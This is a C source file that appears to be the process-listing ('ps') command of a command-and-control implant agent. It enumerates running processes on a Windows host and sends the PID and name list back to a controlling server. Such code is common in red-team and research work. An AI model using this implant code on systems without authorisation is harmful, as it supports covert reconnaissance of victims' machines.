#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "ps.h"
#include "../Command.h"
#include "../Utils.h"

BOOL executePs(PParser arguments)
{
    // 1. Get Task UUID
    SIZE_T uuidLen = 0;
    PBYTE uuidBytes = ParserGetBytes(arguments, &uuidLen);
    
    if (!uuidBytes) return FALSE;

    PCHAR taskUuid = (PCHAR)LocalAlloc(LPTR, uuidLen + 1);
    memcpy(taskUuid, uuidBytes, uuidLen);
    taskUuid[uuidLen] = '\0';
    LocalFree(uuidBytes);
    
    // 2. Num Args
    UINT32 nbArg = ParserGetInt32(arguments);
    (void)nbArg;

    PPackage responseTask = PackageCreate();
    PackageAddByte(responseTask, POST_RESPONSE);
    PackageAddBytes(responseTask, (PBYTE)taskUuid, uuidLen);
    PPackage output = PackageCreate();

    LOG("[*] Enumerating processes...");
    
    // Smile for the camera! Creating snapshot.
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32))
        {
             // Header
             char* header = "PID\tName\n===\t====\n";
             PackageAddBytesRaw(output, (PBYTE)header, strlen(header));
             
             do
             {
                 char line[MAX_PATH + 20];
                 snprintf(line, sizeof(line), "%lu\t%s\n", pe32.th32ProcessID, pe32.szExeFile);
                 PackageAddBytesRaw(output, (PBYTE)line, strlen(line));
             } while (Process32Next(hSnapshot, &pe32));
        }
        else
        {
            char* err = "Failed to get first process.";
            PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
        }
        CloseHandle(hSnapshot);
    }
    else
    {
         char* err = "Failed to create snapshot.";
         PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
    }

    PackageAddBytes(responseTask, (PBYTE)output->buffer, output->length);
    PParser ResponseParser = sendPackage(responseTask);
    if (ResponseParser) ParserDestroy(ResponseParser);
    PackageDestroy(responseTask);
    PackageDestroy(output);
    LocalFree(taskUuid);

    return TRUE;
}
